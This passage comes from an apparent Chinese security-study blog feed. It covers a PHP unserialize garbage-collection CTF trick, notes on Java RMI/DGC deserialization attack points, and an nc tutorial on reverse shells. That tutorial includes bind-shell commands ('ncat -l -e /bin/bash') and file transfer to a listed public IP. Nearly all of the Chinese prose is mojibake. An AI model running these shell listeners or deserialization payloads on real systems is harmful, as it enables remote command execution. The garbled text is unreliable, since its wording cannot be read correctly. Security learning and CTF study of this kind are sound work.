class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;ä¸­é€”é€€å‡ºå•¦&#x27;</span>);</span><br></pre></td></tr></table></figure></div><p>æˆ‘ä»¬å‡å¦‚è¦æ‰§è¡Œ__destructæ–¹æ³•ï¼Œæ‰“å°flagï¼Œå°±å¾—ç»•è¿‡è¿™ä¸ª<code>throw new Exception</code>ã€‚å› ä¸º<code>__destruct</code>æ–¹æ³•æ˜¯åœ¨è¯¥å¯¹è±¡è¢«å›æ”¶æ—¶è°ƒç”¨ï¼Œè€Œ<code>exception</code>ä¼šä¸­æ–­è¯¥è¿›ç¨‹å¯¹è¯¥å¯¹è±¡çš„é”€æ¯ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¼ºåˆ¶è®©phpçš„GCï¼ˆåƒåœ¾å›æ”¶æœºåˆ¶ï¼‰å»è¿›è¡Œè¯¥å¯¹è±¡çš„å›æ”¶ã€‚</p><p>æ ¸å¿ƒæ€æƒ³ï¼šååºåˆ—åŒ–ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åå†åˆ©ç”¨ç¬¬ä¸€ä¸ªç´¢å¼•ï¼Œæ¥è§¦å‘GC</p><p>EXP</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;AndyNoel&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> B, <span class="keyword">new</span> B));</span><br><span class="line"></span><br><span class="line"><span class="comment">//a:2:&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:1;O:1:&quot;B&quot;:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>é€ æˆè¯¥æ¼æ´çš„ä¸»è¦åŸå› æ˜¯ArrayObjectç¼ºå°‘åƒåœ¾å›æ”¶å‡½æ•°ã€‚è¯¥æ¼æ´ç§°ä¸ºâ€œåŒé€’å‡æ¼æ´â€</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> gc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMIå­¦ä¹ </title>
      <link href="/2022/10/01/RMI%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/10/01/RMI%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="RMIå­¦ä¹ "><a href="#RMIå­¦ä¹ " class="headerlink" title="RMIå­¦ä¹ "></a>RMIå­¦ä¹ </h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h3 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h3><ul><li>Client</li><li>Registry</li><li>Server</li></ul><h3 id="é€šä¿¡åŸç†"><a href="#é€šä¿¡åŸç†" class="headerlink" title="é€šä¿¡åŸç†"></a>é€šä¿¡åŸç†</h3><ul><li>æœåŠ¡ç«¯ç»‘å®šè¿œç¨‹å¯¹è±¡(javaä¸­å®šä¹‰çš„ä¸€ä¸ªè¿œç¨‹å¯¹è±¡ç±»)</li><li>å®¢æˆ·ç«¯åªè¦ä¼ value</li><li>è§£å†³ç«¯å£é—®é¢˜ï¼šæ³¨å†Œä¸­å¿ƒï¼Œå‚¨å­˜è¿œç¨‹å¯¹è±¡valueä¸æœåŠ¡ç«¯ç«¯å£çš„æ˜ å°„(åœ¨è¿œç¨‹å¯¹è±¡åˆ›å»ºæ—¶å½¢æˆæ˜ å°„)</li></ul><blockquote><h4 id="åŠ¨æ€ä»£ç åŠ è½½ï¼ˆJDKé«˜ç‰ˆæœ¬å»æ‰äº†ï¼‰"><a href="#åŠ¨æ€ä»£ç åŠ è½½ï¼ˆJDKé«˜ç‰ˆæœ¬å»æ‰äº†ï¼‰" class="headerlink" title="åŠ¨æ€ä»£ç åŠ è½½ï¼ˆJDKé«˜ç‰ˆæœ¬å»æ‰äº†ï¼‰"></a>åŠ¨æ€ä»£ç åŠ è½½ï¼ˆJDKé«˜ç‰ˆæœ¬å»æ‰äº†ï¼‰</h4><p>å¦‚æœå®¢æˆ·ç«¯è°ƒç”¨äº†æœåŠ¡ç«¯æ²¡æœ‰çš„ç±»å¯¹è±¡ï¼ŒRMIå…è®¸æœåŠ¡ç«¯å»è¿œç¨‹çš„Web Serverä¸ŠåŠ è½½ç±»</p></blockquote><h3 id="è¿œç¨‹æ¥å£ã€å¯¹è±¡ã€æ–¹æ³•"><a href="#è¿œç¨‹æ¥å£ã€å¯¹è±¡ã€æ–¹æ³•" class="headerlink" title="è¿œç¨‹æ¥å£ã€å¯¹è±¡ã€æ–¹æ³•"></a>è¿œç¨‹æ¥å£ã€å¯¹è±¡ã€æ–¹æ³•</h3><p>é€šä¿¡çš„ä¸¤ç«¯è¦å®ç°ä¸€ä¸ªç›¸åŒæ¥å£:java.rmi.Remote</p><p>è¿™ä¸ªæ¥å£è¦æŠ›ä¸€ä¸ªå¼‚å¸¸</p><p>æœåŠ¡ç«¯å®ç°è¿œç¨‹è°ƒç”¨çš„æ¥å£æ—¶ï¼Œè¦ç»§æ‰¿UnicastRemoteObject,è¿™æ ·æ‰èƒ½ç»‘å®šåˆ°rmiæœåŠ¡é‡Œ</p><h3 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/008vxvgGgy1h7k0v45q93j31dg0u0afc.jpg"                      alt="image-20221027182807035"                ><figcaption>image-20221027182807035</figcaption></figure></p><blockquote><p>å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½å„è‡ªè®¾ç½®äº†ä¸€ä¸ªä»£ç† Skeleton&#x2F;Stub</p><p>å¦‚æœç»‘å®šç«¯å£åˆ°0ï¼Œä¼šè¢«åˆ†é…åˆ°éšæœºç«¯å£</p><p>æ³¨å†Œä¸­å¿ƒå’ŒæœåŠ¡ç«¯æ”¾åœ¨ä¸€å°æœåŠ¡å™¨ä¸Šï¼Œé˜²æ­¢è¿œç¨‹è°ƒç”¨æ—¶çš„å®‰å…¨é—®é¢˜</p></blockquote><p>JRMPåè®®ï¼šRMIè‡ªå®šä¹‰çš„å®¢æˆ·ç«¯åè®®</p><blockquote><p>å¯ä»¥é€šè¿‡è¿™ä¸ªåè®®æ”»å‡»stub</p></blockquote><p>ä¼ è¾“è¿‡ç¨‹åˆ©ç”¨åºåˆ—åŒ–ï¼Œå°†æ”¶å–åˆ°çš„æ•°æ®ååºåˆ—åŒ–ï¼Œå­˜åœ¨æ”»å‡»ç‚¹</p><h3 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h3><p>é™æ€å˜é‡dgclogï¼Œè°ƒç”¨æ—¶ä¼šè§¦å‘è¿™ä¸ªç±»çš„åˆå§‹åŒ–ï¼Œå…¶é™æ€ä»£ç å—ä¸­ä¼šå®ä¾‹åŒ–ä¸€ä¸ªDGCImpl_Stub</p><blockquote><p>é£é™©ç‚¹:è°ƒç”¨invokeï¼Œå¯è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</p><p>æ”»å‡»dgcä¸éœ€è¦çŸ¥é“å‚æ•°ç±»å‹</p></blockquote><h3 id="Stubå’ŒSkeleton"><a href="#Stubå’ŒSkeleton" class="headerlink" title="Stubå’ŒSkeleton"></a>Stubå’ŒSkeleton</h3><p>Stubï¼šå®¢æˆ·ç«¯ä»£ç†ç±»</p><p>Skeletonï¼šæœåŠ¡ç«¯ä»£ç†ç±»</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032332854.png"                      alt="image-20221101190521314"                ><figcaption>image-20221101190521314</figcaption></figure></p><blockquote><p>å®ç°è¿‡ç¨‹</p><ul><li>å®¢æˆ·ç«¯è¦è°ƒç”¨è¿œç¨‹ä¸»æœºä¸Šçš„æ–¹æ³•</li><li>ç»è¿‡Stubçš„ä»£ç†ï¼Œè¯·æ±‚æ¯ç¼–ç é€šè¿‡ç½‘ç»œä¼ è¾“ç»™Skeleton</li><li>Skeletonæ”¶åˆ°è¯·æ±‚ï¼Œè½¬æ¢æˆæœåŠ¡ç«¯å¯ä»¥è¯†åˆ«çš„è¯·æ±‚</li><li>å‘é€è¯·æ±‚åˆ°æœåŠ¡çš„</li><li>æœåŠ¡ç«¯å¤„ç†åç»“æ„ï¼Œå‘é€åˆ°Skeletonè¿›è¡Œç¼–ç </li><li>Stubæ”¶åˆ°åè§£ç ç»“æœ</li><li>å®¢æˆ·ç«¯è·å¾—è¿œç¨‹æ–¹æ³•è°ƒç”¨çš„ç»“æœ</li></ul></blockquote><h3 id="æ³¨å†Œè¿œç¨‹å¯¹è±¡"><a href="#æ³¨å†Œè¿œç¨‹å¯¹è±¡" class="headerlink" title="æ³¨å†Œè¿œç¨‹å¯¹è±¡"></a>æ³¨å†Œè¿œç¨‹å¯¹è±¡</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteInterface</span> <span class="variable">remoteObj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteImpl</span>();<span class="comment">// åˆ›å»ºè¿œç¨‹å¯¹è±¡</span></span><br><span class="line"><span class="type">Context</span> <span class="variable">namingContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">// åˆå§‹åŒ–å‘½åå†…å®¹</span></span><br><span class="line">LocateRegistry.createRegistry(<span class="number">8892</span>);<span class="comment">// åœ¨æœ¬åœ°ä¸»æœºä¸Šåˆ›å»ºå’Œå¯¼å‡ºæ³¨å†Œè¡¨å®ä¾‹ï¼Œå¹¶åœ¨æŒ‡å®šçš„ç«¯å£ä¸Šæ¥å—è¯·æ±‚</span></span><br><span class="line">namingContext.rebind(<span class="string">&quot;rmi://localhost:8892/RemoteObj2&quot;</span>, remoteObj2);<span class="comment">// æ³¨å†Œå¯¹è±¡ï¼Œå³æŠŠå¯¹è±¡ä¸ä¸€ä¸ªåå­—ç»‘å®šã€‚</span></span><br></pre></td></tr></table></figure></div><blockquote><p>åªè¦ç»§æ‰¿äº†java.rmi.Remoteæ¥å£ï¼Œå°±å¯ä»¥æˆä¸ºå­˜åœ¨äºæœåŠ¡å™¨çš„è¿œç¨‹å¯¹è±¡</p><p>è¿œç¨‹å¯¹è±¡å¿…é¡»å®ç°java.rmi.server.UniCastRemoteObjectç±»ï¼Œè¯¥ç±»çš„æ„é€ å‡½æ•°ä¸­å°†ç”Ÿæˆstubå’Œskeletonï¼Œ è¿™æ ·æ‰èƒ½ä¿è¯å®¢æˆ·ç«¯è®¿é—®è·å¾—è¿œç¨‹å¯¹è±¡æ—¶ï¼Œè¯¥è¿œç¨‹å¯¹è±¡å°†ä¼šæŠŠè‡ªèº«çš„ä¸€ä¸ªæ‹·è´ä»¥Socketçš„å½¢å¼ä¼ è¾“ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯æ‰€è·å¾—çš„è¿™ä¸ªæ‹·è´ç§°ä¸ºStubï¼ˆ å­˜æ ¹ï¼‰ï¼Œ è€ŒæœåŠ¡å™¨ç«¯æœ¬èº«å·²å­˜åœ¨çš„è¿œç¨‹å¯¹è±¡åˆ™ç§°ä¹‹ä¸ºSkeletonï¼ˆéª¨æ¶ï¼‰ ã€‚ </p></blockquote><h2 id="è·å–æ³¨å†Œä¸­å¿ƒ"><a href="#è·å–æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="è·å–æ³¨å†Œä¸­å¿ƒ"></a>è·å–æ³¨å†Œä¸­å¿ƒ</h2><h3 id="åˆ›å»ºæ—¶è·å–-createRegistry"><a href="#åˆ›å»ºæ—¶è·å–-createRegistry" class="headerlink" title="åˆ›å»ºæ—¶è·å–  createRegistry"></a>åˆ›å»ºæ—¶è·å–  createRegistry</h3><ul><li><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.seebug.org/content/images/2020/06/22/1592803976000-6usyel.png-w331s"                      alt="-w1067"                ><figcaption>-w1067</figcaption></figure><ul><li>ç¬¬ä¸€ç§åªè¦ä¼ portï¼Œè¡¨ç¤ºå’Œæ³¨å†Œä¸­å¿ƒç”³è¯·ä½¿ç”¨çš„ç«¯å£ï¼Œåé¢å†ç»‘å®švalueä¸Šå»ä»¥ä¾¿å®¢æˆ·ç«¯è¯·æ±‚</li><li>ç¬¬äºŒå¼ ä¼ portå¤–ï¼Œè¿˜éœ€è¦ä¼ é€’RMIClientSocketFactoryä»¥åŠRMIServerSocketFactoryå¯¹è±¡ã€‚</li><li>ä¸¤ä¸ªæ–¹æ³•æœ€ç»ˆè·å–åˆ°çš„éƒ½æ˜¯RegistryImplå¯¹è±¡ï¼Œå¯¹äºæ”»å‡»è€…çš„æˆ‘ä»¬å…³ç³»å¹¶ä¸å¤§</li></ul></li></ul><h4 id="å¯¹ç¬¬ä¸€ç§æ–¹æ³•çš„åˆ†æ"><a href="#å¯¹ç¬¬ä¸€ç§æ–¹æ³•çš„åˆ†æ" class="headerlink" title="å¯¹ç¬¬ä¸€ç§æ–¹æ³•çš„åˆ†æ"></a>å¯¹ç¬¬ä¸€ç§æ–¹æ³•çš„åˆ†æ</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">createRegistry</span><span class="params">(<span class="type">int</span> var0)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryImpl</span>(var0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>var0ä¾¿å‚¨å­˜ç€æˆ‘ä»¬è¦ä¼ é€’çš„port</p></blockquote><p>è·Ÿè¿›</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RegistryImpl</span><span class="params">(<span class="type">int</span> var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="type">LiveRef</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, var1);</span><br><span class="line">    <span class="built_in">this</span>.setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(var2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>LiveRefå°è£…äº†ipå’Œç«¯å£</p></blockquote><h3 id="è¿œç¨‹è·å–-getRegistry"><a href="#è¿œç¨‹è·å–-getRegistry" class="headerlink" title="è¿œç¨‹è·å– getRegistry"></a>è¿œç¨‹è·å– getRegistry</h3><h2 id="JDKé«˜ç‰ˆæœ¬ç»•è¿‡"><a href="#JDKé«˜ç‰ˆæœ¬ç»•è¿‡" class="headerlink" title="JDKé«˜ç‰ˆæœ¬ç»•è¿‡"></a>JDKé«˜ç‰ˆæœ¬ç»•è¿‡</h2><h3 id="é«˜ç‰ˆæœ¬åšçš„é˜²å¾¡"><a href="#é«˜ç‰ˆæœ¬åšçš„é˜²å¾¡" class="headerlink" title="é«˜ç‰ˆæœ¬åšçš„é˜²å¾¡"></a>é«˜ç‰ˆæœ¬åšçš„é˜²å¾¡</h3><p>ååºåˆ—åŒ–å‰åˆ¤æ–­ç±»å‹</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/008vxvgGgy1h7k4ct7zeqj312m0egjt5.jpg"                      alt="image-20221027202856361"                ><figcaption>image-20221027202856361</figcaption></figure></p><p>dgcååºåˆ—åŒ–ä¹Ÿåšäº†è¿‡æ»¤</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/008vxvgGgy1h7k4djvmlqj30qy08ydgc.jpg"                      alt="image-20221027202941346"                ><figcaption>image-20221027202941346</figcaption></figure></p><p>è¿œç¨‹å¯¹è±¡ååºåˆ—åŒ–ï¼Œéœ€è¦çŸ¥é“å…·ä½“å‚æ•°ç±»å‹</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>æœåŠ¡ç«¯å‘èµ·å¯¹å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä½¿ç”¨dgcå‘å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚,é€šè¿‡åˆ©ç”¨é“¾è°ƒç”¨dgcçš„dirtyæ–¹æ³•æ¥ç»™å®¢æˆ·ç«¯å‘è¯·æ±‚</p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ncå‘½ä»¤å­¦ä¹ åŠåå¼¹shellç»†èŠ‚</title>
      <link href="/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/"/>
      <url>/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/</url>
      
        <content type="html"><![CDATA[<h1 id="ncå‘½ä»¤å­¦ä¹ åŠåå¼¹shellç»†èŠ‚"><a href="#ncå‘½ä»¤å­¦ä¹ åŠåå¼¹shellç»†èŠ‚" class="headerlink" title="ncå‘½ä»¤å­¦ä¹ åŠåå¼¹shellç»†èŠ‚"></a>ncå‘½ä»¤å­¦ä¹ åŠåå¼¹shellç»†èŠ‚</h1><table><thead><tr><th align="left">æœºå™¨åç§°</th><th align="left">IPåœ°å€</th><th>æ“ä½œç³»ç»Ÿ</th></tr></thead><tbody><tr><td align="left">root@Decemberus</td><td align="left">114.223.4.218</td><td>Centos7</td></tr><tr><td align="left">root@Sloth</td><td align="left">124.223.207.184</td><td>Centos7</td></tr><tr><td align="left">ğŸ¥£</td><td align="left">å†…ç½‘</td><td>Mac os</td></tr></tbody></table><h2 id="ncå‘½ä»¤ä½¿ç”¨"><a href="#ncå‘½ä»¤ä½¿ç”¨" class="headerlink" title="ncå‘½ä»¤ä½¿ç”¨"></a>ncå‘½ä»¤ä½¿ç”¨</h2><h3 id="ç‰ˆæœ¬"><a href="#ç‰ˆæœ¬" class="headerlink" title="ç‰ˆæœ¬"></a>ç‰ˆæœ¬</h3><ul><li><p><code>netcat-traditional</code>:Kali Linux é»˜è®¤å¸¦çš„å°±æ˜¯è¿™ä¸ªç‰ˆæœ¬ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„ nc å…·æœ‰<code>-e</code>é€‰é¡¹ï¼Œååˆ†æ–¹ä¾¿åå¼¹ shell ä½¿ç”¨</p></li><li><p><code>netcat-openbsd</code>:ubuntu é‡Œé»˜è®¤çš„ nc å‘½ä»¤æŒ‡å‘çš„æ˜¯netcat-openbsdã€‚è¿™ä¸ªç‰ˆæœ¬å› ä¸ºè€ƒè™‘åˆ°å®‰å…¨æ€§ç­‰åŸå› æ²¡æœ‰<code>-e</code>é€‰é¡¹ã€‚</p></li><li><p><code>ncat</code>:CentOSã€Red Hat é»˜è®¤å¸¦çš„æ˜¯ ncatã€‚ç›®å‰ncatå·²ç»é›†æˆåˆ°äº† nmap é‡Œé¢ï¼Œå®‰è£…å®Œ nmap åå°±å¯ä»¥ä½¿ç”¨<code>ncat</code>å‘½ä»¤äº†</p></li></ul><blockquote><p>macä¸Šè‡ªå¸¦ncå‘½ä»¤æŒ‡å‘çš„æ˜¯ncat,linuxä¸Šncä¸ncatæ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œmacä¸Šæœ€å¥½ç”¨ncat,optionsæ¯”è¾ƒå…¨</p></blockquote><h3 id="å‰ææ¡ä»¶åŠæ³¨æ„äº‹é¡¹"><a href="#å‰ææ¡ä»¶åŠæ³¨æ„äº‹é¡¹" class="headerlink" title="å‰ææ¡ä»¶åŠæ³¨æ„äº‹é¡¹"></a>å‰ææ¡ä»¶åŠæ³¨æ„äº‹é¡¹</h3><ul><li><p>åªèƒ½ncæ‹¥æœ‰å…¬ç½‘ipçš„æœºå™¨ï¼Œæˆ–æ˜¯åœ¨åŒä¸€å±€åŸŸç½‘ä¸‹çš„å†…ç½‘æœºå™¨(å¯ä»¥ncå†…ç½‘ip)</p></li><li><p>è·å–æœ¬æœºå…¬ç½‘ip</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl ifconfig.me </span><br></pre></td></tr></table></figure></div></li><li><p>ç«¯å£æ”¾è¡Œï¼šå¦‚æœæ˜¯è´­ä¹°äº†è…¾è®¯äº‘æœåŠ¡ï¼Œè¦åœ¨æ§åˆ¶å°å’Œå®å¡”é¢æ¿åŒæ—¶æ”¾è¡Œç«¯å£(ç”¨äºTCPè¿æ¥)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310253657.jpg"                      alt="image-20220926010406603"                ><figcaption>image-20220926010406603</figcaption></figure></p></li><li><p>éœ€è¦vpså…ˆç›‘å¬ï¼Œç›®æ ‡æœåŠ¡å™¨å†nc vpsï¼Œç›´æ¥ncåªèƒ½é€šè¿‡udpè¿æ¥ï¼Œtcpè¿æ¥æ˜¾ç¤ºæ‹’ç»(å¦‚æœæ˜¯ç«¯å£æœªæ”¾è¡Œä¼šæ˜¾ç¤ºè¿æ¥è¶…æ—¶)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310254528.jpg"                      alt="image-20220926005629905"                ><figcaption>image-20220926005629905</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310254598.jpg"                      alt="image-20220926005900622"                ><figcaption>image-20220926005900622</figcaption></figure></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æœªæ”¾è¡Œç«¯å£</span></span><br><span class="line">[root@Decemberus ~]# nc 124.223.207.184 3345</span><br><span class="line">Ncat: Connection timed out.</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="æ–‡å­—äº¤äº’"><a href="#æ–‡å­—äº¤äº’" class="headerlink" title="æ–‡å­—äº¤äº’"></a>æ–‡å­—äº¤äº’</h3><p><code>-l</code>ï¼šä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç›‘æ§ä¼ å…¥çš„ä¿¡æ¯</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3344 <span class="comment"># ç›‘å¬3344ç«¯å£</span></span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310254143.jpg"                      alt="image-20220926004654073"                ><figcaption>image-20220926004654073</figcaption></figure></p><blockquote><p>åªæ˜¯ç®€å•çš„æ–‡å­—äº¤äº’ï¼Œç›¸å½“äºèŠå¤©å·¥å…·ï¼Œå¯¹æ•°æ®ç¼–ç æ²¡æœ‰è¦æ±‚ï¼Œä½†æ— æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p></blockquote><h3 id="å‘½ä»¤äº¤äº’"><a href="#å‘½ä»¤äº¤äº’" class="headerlink" title="å‘½ä»¤äº¤äº’"></a>å‘½ä»¤äº¤äº’</h3><p><code>-e</code>ï¼šå°†ä¼ å…¥çš„ä¿¡æ¯ä»¥å‘½ä»¤æ‰§è¡Œ</p><p>å°†<code>/bin/bash</code>é€šè¿‡ 3344 ç«¯å£æ¥ç›‘å¬ï¼Œå°†æ”¶åˆ°çš„ä¿¡æ¯éƒ½å‘é€åˆ°<code>/bin/bash</code></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -l -e /bin/bash 3344</span><br></pre></td></tr></table></figure></div><blockquote><p><code>/bin/bash</code>æ˜¯shellè§£é‡Šå™¨ï¼Œæ ¹æ®ç›®æ ‡æœºå™¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>/bin/sh</code>æˆ–<code>/bin/zsh</code></p><p>è®¿é—®ç«¯å¯ä»¥é€šè¿‡ncè¯¥ç³»ç»Ÿçš„2333ç«¯å£ï¼Œè¾“å…¥ç«¯æŒ‡ä»¤ä¼šä¼ å…¥è¯¥ç³»ç»Ÿçš„&#x2F;bin&#x2F;bash æ‰§è¡ŒæˆåŠŸåä¼šè¿”å›ä¿¡æ¯ï¼Œç±»ä¼¼äºsshæ“ä½œè¿æ¥æ¥è¯¥ç³»ç»Ÿä¸€æ ·</p></blockquote><h3 id="æŒä¹…ç›‘å¬"><a href="#æŒä¹…ç›‘å¬" class="headerlink" title="æŒä¹…ç›‘å¬"></a>æŒä¹…ç›‘å¬</h3><p><code>-k</code>: å®¢æˆ·ç«¯æ–­æ‰è¿æ¥æ—¶ï¼ŒæœåŠ¡ç«¯ä¾ç„¶ä¿æŒè¿è¡Œ<br><code>-v</code>ï¼šç°å®æŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ç»†èŠ‚</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvk -e  /bin/bash 2333</span><br></pre></td></tr></table></figure></div><blockquote><p>å®¢æˆ·ç«¯ä½¿ç”¨<code>CTRL + c</code>æˆ–<code>CTRL + d</code>æ–­å¼€è¿æ¥çš„æ—¶å€™ï¼Œç›‘å¬ç«¯çš„ ncat ä¾ç„¶åœ¨è¿è¡Œï¼Œè¿™æ ·æ–¹ä¾¿å®¢æˆ·ç«¯ä¸‹æ¬¡ç›´æ¥ nc è¿è¿›æ¥</p></blockquote><h3 id="æ–‡ä»¶ä¼ è¾“"><a href="#æ–‡ä»¶ä¼ è¾“" class="headerlink" title="æ–‡ä»¶ä¼ è¾“"></a>æ–‡ä»¶ä¼ è¾“</h3><h4 id="ä¸Šä¼ æ–‡ä»¶åˆ°è¿œç¨‹"><a href="#ä¸Šä¼ æ–‡ä»¶åˆ°è¿œç¨‹" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶åˆ°è¿œç¨‹"></a>ä¸Šä¼ æ–‡ä»¶åˆ°è¿œç¨‹</h4><p>root@Slothè¿œç¨‹æœåŠ¡å™¨è¿è¡Œï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -l 3344 &gt; hello.txt</span><br></pre></td></tr></table></figure></div><p>macOS æœ¬åœ°è¿è¡Œï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat 124.223.207.184 3344 &lt; hello.txt</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301310255144.jpg"                      alt="image-20220926011113841"                ><figcaption>image-20220926011113841</figcaption></figure></p><blockquote><p>æ­¤æ—¶ä¼šå°† macOS çš„æ–‡ä»¶ä¼ è¾“åˆ°è¿œç¨‹çš„ CentOS æœåŠ¡å™¨ä¸Šï¼Œä¼ è¾“å®Œæˆåï¼Œä¸¤ä¸ª ncat ä¼šè¯éƒ½å°†ç»ˆæ­¢ã€‚</p></blockquote><h4 id="ä»è¿œç¨‹ä¸‹è½½æ–‡ä»¶"><a href="#ä»è¿œç¨‹ä¸‹è½½æ–‡ä»¶" class="headerlink" 